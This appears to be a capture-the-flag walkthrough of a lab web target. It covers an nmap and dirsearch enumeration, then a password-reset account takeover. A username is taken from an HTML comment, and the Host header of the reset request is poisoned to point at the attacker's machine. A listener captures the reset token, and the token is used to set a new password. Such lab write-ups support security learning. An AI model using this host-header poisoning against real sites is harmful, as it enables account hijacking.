TCP SCAN




> TARGET=10.129.71.155 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Werkzeug/2.1.2 Python/3.8.10
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Sun, 13 Nov 2022 20:04:35 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 32775
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Sun, 13 Nov 2022 20:04:26 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 32770
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Sun, 13 Nov 2022 20:04:27 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     X-Varnish: 3
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Login
  
  
  
WEB ENUM
  
  
  
> dirsearch -u http://10.129.71.155/

15:19:10] 200 -    5KB - /forgot
[15:19:14] 401 -   19B  - /home
[15:19:26] 401 -   19B  - /login
[15:19:50] 200 -    5KB - /reset
Inspecting the code at http://10.129.71.155, found a comment that reveals a username. We can attempt to reset the password of this account
<!-- Q1 release fix by robert-dev-10045 -->
ACCOUNT TAKEOVER
Trying the account at http://10.129.71.155/forgot will show the following message, ensuring it’s a valid account
Password reset link has been sent to user inbox. Please use the link to reset your password
Intercept the requests with burp and examine the password reset request
# Change the host header of the reset req to kali box
GET /forgot?username=robert-dev-10045 HTTP/1.1
Host: <kali-ip>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.129.71.155/forgot
Cookie: <cookies>


# setup a listener to capture the reset response
INFO:root:Starting httpd...

INFO:root:GET request,
Path: /reset?token=<reset-token>
Headers:
Host: <kali-ip>
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

10.129.71.155 - - [13/Nov/2022 17:27:09] "GET /reset?token=<reset-token> HTTP/1.1" 200 -
Now, we captured the reset token, we can now use this token to reset the password of the account robert-dev-10045. NOTE: the token may contain some character that will be interpreted by the browser, therefore, it’s important to url encode the token before sending. Also, some tokens work, some don’t; be patient.
POST /reset?token=<url-encoded-token> HTTP/1.1
Host: 10.129.71.155
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://10.129.71.155
Connection: close
Referer: http://10.129.71.155/reset?token=<url-encoded-token>
Cookie: <cookies>

password=test
The changed password expires very quickly, so you may need to repeat this multiple times.
After resetting the password, we can now login as robert-dev-10045
